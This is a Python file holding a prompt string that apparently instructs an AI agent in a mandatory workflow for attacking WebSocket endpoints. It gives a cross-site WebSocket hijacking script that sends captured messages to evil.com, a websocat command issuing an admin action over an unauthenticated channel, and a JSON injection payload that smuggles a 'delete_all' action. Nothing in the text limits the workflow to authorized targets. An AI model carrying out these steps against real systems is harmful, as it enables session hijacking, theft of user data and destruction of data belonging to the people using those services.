"""
WebSocket Attack Skill Prompt.
"""
WEBSOCKET_SKILL_PROMPT = """
## ATTACK SKILL: WEBSOCKET ATTACKS

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Find WebSocket connections: `ws://` or `wss://` in JavaScript, `Upgrade: websocket` in request headers, DevTools Network tab → WS filter.

#### STEP 2: CSWSH (Cross-Site WebSocket Hijacking)
If WebSocket handshake doesn't validate Origin header:
```html
<script>
var ws = new WebSocket('wss://TARGET/socket');
ws.onmessage = function(e) { fetch('https://evil.com/?data=' + btoa(e.data)); };
ws.onopen = function() { ws.send('malicious-payload'); };
</script>
```

#### STEP 3: UNAUTHENTICATED WS CHANNELS
Connect without authentication tokens:
```bash
websocat wss://TARGET/socket
> {"action": "admin_command"}
```

#### STEP 4: MESSAGE INJECTION
If user input reaches WS messages without sanitization:
```
{"message": "test\"},{\"action\":\"delete_all\",\"ignore\":\""}
```

#### ANTI-PATTERNS: Don't ignore ws:// (non-TLS) — it's often used for internal services.
"""
